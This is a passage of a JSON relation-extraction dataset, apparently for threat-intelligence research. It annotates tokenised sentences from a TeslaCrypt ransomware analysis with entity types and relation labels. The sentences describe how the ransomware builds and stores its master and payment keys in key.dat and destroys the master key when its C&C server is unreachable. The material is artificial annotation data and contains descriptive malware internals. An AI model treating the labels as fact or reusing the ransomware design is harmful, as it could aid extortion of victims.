"name": "generic buffer", "pos": [15, 17], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [163, 163], "name": "data", "pos": [20, 21], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [171, 171], "name": "master key", "pos": [1, 3], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [175, 175], "name": "payment key", "pos": [5, 7], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [192, 192], "name": "SHA256", "pos": [22, 23], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [198, 198], "name": "custom algorithm", "pos": [28, 30], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [214, 214], "name": "shifted SHA256 values", "pos": [2, 5], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [222, 222], "name": "key.dat", "pos": [10, 11], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [230, 230], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [238, 238], "name": "key.dat", "pos": [12, 13], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "RD", "evidence": [2], "h": 3, "t": 5}, {"r": "RD", "evidence": [2], "h": 3, "t": 6}, {"r": "RD", "evidence": [2], "h": 3, "t": 7}, {"r": "RD", "evidence": [2], "h": 3, "t": 8}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "CO", "evidence": [2], "h": 3, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 11}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 13}, {"r": "FR", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 16}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 17}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 19}, {"r": "EX", "evidence": [4, 5], "h": 14, "t": 20}, {"r": "WR", "evidence": [4, 5, 6], "h": 14, "t": 21}, {"r": "WR", "evidence": [4, 5, 6], "h": 14, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 22, "t": 24}, {"r": "RD", "evidence": [7], "h": 23, "t": 24}]}, {"title": "663-15", "sents": [["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "GetAndHashOsData", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "it", "pos": [2, 3], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [32, 32], "name": "LAN network statistics", "pos": [13, 16], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [45, 45], "name": "Windows Crypto", "pos": [26, 28], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [55, 55], "name": "process descriptors", "pos": [36, 38], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [64, 64], "name": "loaded modules", "pos": [45, 47], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [72, 72], "name": "physical memory", "pos": [53, 55], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [80, 80], "name": "it", "pos": [61, 62], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [86, 86], "name": "SHA1 values", "pos": [67, 69], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [101, 101], "name": "it", "pos": [3, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [106, 106], "name": "global SHA1 value", "pos": [8, 11], "index": "10_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [122, 122], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [132, 132], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "12_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [140, 140], "name": "generic buffer", "pos": [15, 17], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [145, 145], "name": "data", "pos": [20, 21], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [153, 153], "name": "master key", "pos": [1, 3], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [157, 157], "name": "payment key", "pos": [5, 7], "index": "16_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [174, 174], "name": "SHA256", "pos": [22, 23], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [180, 180], "name": "custom algorithm", "pos": [28, 30], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [196, 196], "name": "shifted SHA256 values", "pos": [2, 5], "index": "19_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [204, 204], "name": "key.dat", "pos": [10, 11], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [212, 212], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [220, 220], "name": "key.dat", "pos": [12, 13], "index": "22_0"}]], "labels": [{"r": "EX", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 1, "t": 4}, {"r": "RD", "evidence": [1], "h": 1, "t": 5}, {"r": "RD", "evidence": [1], "h": 1, "t": 6}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "CO", "evidence": [1], "h": 1, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 9}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2], "h": 9, "t": 11}, {"r": "FR", "evidence": [2, 3], "h": 9, "t": 12}, {"r": "RD", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "RD", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3], "h": 12, "t": 14}, {"r": "WR", "evidence": [3, 4], "h": 12, "t": 15}, {"r": "WR", "evidence": [3, 4], "h": 12, "t": 16}, {"r": "WR", "evidence": [3, 4], "h": 12, "t": 17}, {"r": "EX", "evidence": [3, 4], "h": 12, "t": 18}, {"r": "WR", "evidence": [3, 4, 5], "h": 12, "t": 19}, {"r": "WR", "evidence": [3, 4, 5], "h": 12, "t": 20}, {"r": "CO", "evidence": [5, 6], "h": 20, "t": 22}, {"r": "RD", "evidence": [6], "h": 21, "t": 22}]}, {"title": "663-16", "sents": [["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "it", "pos": [2, 3], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [13, 13], "name": "LAN network statistics", "pos": [13, 16], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [26, 26], "name": "Windows Crypto", "pos": [26, 28], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [36, 36], "name": "process descriptors", "pos": [36, 38], "index": "3_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [45, 45], "name": "loaded modules", "pos": [45, 47], "index": "4_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [53, 53], "name": "physical memory", "pos": [53, 55], "index": "5_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [61, 61], "name": "it", "pos": [61, 62], "index": "6_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [67, 67], "name": "SHA1 values", "pos": [67, 69], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [82, 82], "name": "it", "pos": [3, 4], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [87, 87], "name": "global SHA1 value", "pos": [8, 11], "index": "9_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [103, 103], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [113, 113], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "11_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [121, 121], "name": "generic buffer", "pos": [15, 17], "index": "12_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [126, 126], "name": "data", "pos": [20, 21], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [134, 134], "name": "master key", "pos": [1, 3], "index": "14_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [138, 138], "name": "payment key", "pos": [5, 7], "index": "15_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [155, 155], "name": "SHA256", "pos": [22, 23], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [161, 161], "name": "custom algorithm", "pos": [28, 30], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [177, 177], "name": "shifted SHA256 values", "pos": [2, 5], "index": "18_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [185, 185], "name": "key.dat", "pos": [10, 11], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [193, 193], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [201, 201], "name": "key.dat", "pos": [12, 13], "index": "21_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [263, 263], "name": "key.dat", "pos": [11, 12], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [282, 282], "name": "TeslaCrypt", "pos": [30, 31], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [288, 288], "name": "dropper", "pos": [36, 37], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [292, 292], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "25_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "h": 0, "t": 4}, {"r": "RD", "evidence": [0], "h": 0, "t": 5}, {"r": "WR", "evidence": [0], "h": 6, "t": 7}, {"r": "CO", "evidence": [0], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 8}, {"r": "WR", "evidence": [1], "h": 8, "t": 9}, {"r": "RD", "evidence": [1], "h": 8, "t": 10}, {"r": "FR", "evidence": [1, 2], "h": 8, "t": 11}, {"r": "RD", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2], "h": 11, "t": 12}, {"r": "RD", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2], "h": 11, "t": 13}, {"r": "WR", "evidence": [2, 3], "h": 11, "t": 14}, {"r": "WR", "evidence": [2, 3], "h": 11, "t": 15}, {"r": "WR", "evidence": [2, 3], "h": 11, "t": 16}, {"r": "EX", "evidence": [2, 3], "h": 11, "t": 17}, {"r": "WR", "evidence": [2, 3, 4], "h": 11, "t": 18}, {"r": "WR", "evidence": [2, 3, 4], "h": 11, "t": 19}, {"r": "CO", "evidence": [4, 5], "h": 19, "t": 21}, {"r": "RD", "evidence": [5], "h": 20, "t": 21}, {"r": "RD", "evidence": [4, 5, 6, 7], "t": 19, "h": 23}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "CO", "evidence": [4, 5, 6, 7], "t": 19, "h": 22}]}, {"title": "663-17", "sents": [["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "it", "pos": [3, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "global SHA1 value", "pos": [8, 11], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [24, 24], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [42, 42], "name": "generic buffer", "pos": [15, 17], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [47, 47], "name": "data", "pos": [20, 21], "index": "5_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [55, 55], "name": "master key", "pos": [1, 3], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [59, 59], "name": "payment key", "pos": [5, 7], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [76, 76], "name": "SHA256", "pos": [22, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "custom algorithm", "pos": [28, 30], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [98, 98], "name": "shifted SHA256 values", "pos": [2, 5], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [106, 106], "name": "key.dat", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [114, 114], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [122, 122], "name": "key.dat", "pos": [12, 13], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [184, 184], "name": "key.dat", "pos": [11, 12], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [203, 203], "name": "TeslaCrypt", "pos": [30, 31], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [209, 209], "name": "dropper", "pos": [36, 37], "index": "16_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [213, 213], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "17_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [226, 226], "name": "victim", "pos": [11, 12], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [233, 233], "name": "firewall", "pos": [18, 19], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [236, 236], "name": "communication", "pos": [21, 22], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [239, 239], "name": "C & C server", "pos": [24, 28], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [245, 245], "name": "dropper", "pos": [30, 31], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [258, 258], "name": "key.dat", "pos": [43, 44], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "EX", "evidence": [1, 2], "h": 3, "t": 9}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 10}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 13}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [3, 4, 5, 6], "t": 11, "h": 15}, {"r": "WR", "evidence": [6], "h": 16, "t": 17}, {"r": "CO", "evidence": [3, 4, 5, 6], "t": 11, "h": 14}, {"r": "UK", "evidence": [7], "h": 18, "t": 20}, {"r": "UK", "evidence": [7], "h": 22, "t": 23}]}, {"title": "663-18", "sents": [["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [15, 15], "name": "generic buffer", "pos": [15, 17], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [20, 20], "name": "data", "pos": [20, 21], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [28, 28], "name": "master key", "pos": [1, 3], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [32, 32], "name": "payment key", "pos": [5, 7], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [49, 49], "name": "SHA256", "pos": [22, 23], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [55, 55], "name": "custom algorithm", "pos": [28, 30], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [71, 71], "name": "shifted SHA256 values", "pos": [2, 5], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [79, 79], "name": "key.dat", "pos": [10, 11], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [95, 95], "name": "key.dat", "pos": [12, 13], "index": "10_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [157, 157], "name": "key.dat", "pos": [11, 12], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [176, 176], "name": "TeslaCrypt", "pos": [30, 31], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [182, 182], "name": "dropper", "pos": [36, 37], "index": "13_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [186, 186], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [199, 199], "name": "victim", "pos": [11, 12], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [206, 206], "name": "firewall", "pos": [18, 19], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [209, 209], "name": "communication", "pos": [21, 22], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [212, 212], "name": "C & C server", "pos": [24, 28], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [218, 218], "name": "dropper", "pos": [30, 31], "index": "19_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [231, 231], "name": "key.dat", "pos": [43, 44], "index": "20_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [246, 246], "name": "recover the files", "pos": [1, 4], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [251, 251], "name": "user", "pos": [6, 7], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [262, 262], "name": "TOR website", "pos": [17, 19], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [267, 267], "name": "recovery key", "pos": [22, 24], "index": "24_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 6}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [2, 3, 4, 5], "t": 8, "h": 12}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5], "t": 8, "h": 11}, {"r": "UK", "evidence": [6], "h": 15, "t": 17}, {"r": "UK", "evidence": [6], "h": 19, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 22}, {"r": "FR", "evidence": [7], "t": 21, "h": 22}, {"r": "ST", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}]}, {"title": "663-19", "sents": [["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", 